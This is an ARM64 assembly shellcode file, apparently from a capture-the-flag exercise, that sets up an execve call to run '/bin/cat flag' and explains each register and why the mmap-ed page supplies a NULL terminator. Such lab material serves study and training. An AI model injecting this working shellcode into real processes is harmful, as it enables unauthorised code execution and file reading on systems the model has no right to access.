.global _start
.text

# Our goal is execve("/bin/cat", {"/bin/cat", "flag"}, NULL)
# This means we need:
# - svc opcode
# - x8 == 221 (__NR_execve)
# - x0 == "/bin/cat"
# - x1 == {"/bin/cat", "flag", NULL} address
# - x2 == NULL
_start:
    mov     x8, 221     /* __NR_execve */

adr_bin_cat_addr:
    # '/bin/cat\0' is in the end of the shellcode (0x110 offset), we calculate it here
    adr     x0, adr_bin_cat_addr+156    
    
    # The pointer array in the second parameter is as some far offset into our page
    # Because the page is mmap-ed, the default values are 0s - so we don't need to write
    # the NULL pointer here ourselves
    adr     x1, pointer_array+0x100
    mov     x2, #0
    adr     x5, flag
    stp     x0, x5, [x1, #0]
    svc     #0

flag:
    .asciz "flag"

pointer_array:
